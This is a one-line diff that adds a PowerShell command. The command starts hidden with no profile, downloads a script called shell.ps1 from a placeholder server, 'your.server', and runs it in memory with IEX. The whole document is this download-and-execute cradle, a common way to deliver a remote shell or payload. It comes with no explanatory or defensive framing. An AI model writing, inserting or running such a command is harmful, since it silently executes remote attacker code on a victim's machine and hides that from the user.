@@ -1,0 +1,1 @@
+powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://your.server/shell.ps1')"
